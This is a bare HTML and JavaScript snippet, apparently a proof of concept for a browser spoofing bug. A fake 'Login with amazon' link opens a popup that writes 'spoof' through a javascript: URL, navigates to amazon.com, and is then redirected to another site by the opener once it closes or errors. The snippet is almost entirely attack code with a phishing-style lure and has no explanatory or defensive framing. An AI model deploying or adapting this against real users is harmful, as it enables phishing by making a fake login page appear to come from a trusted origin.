<script>
  function next() {
         w.location.replace('http://www.google.com/csi');
        }

function f() {
    w = window.open("javascript:document.write('spoof');setTimeout(function(){location='http://amazon.com'}, 100)","new","width=500 height=500");
    
    // Check every 500ms instead of 1ms
    i = setInterval(function() {
        try {
            if (w.closed) {
                clearInterval(i);
                next();
            }
        } catch(e) {
            clearInterval(i);
            next();
        }
    }, 500);
}
</script>

<a href="#" onclick="f()">Login with amazon</a>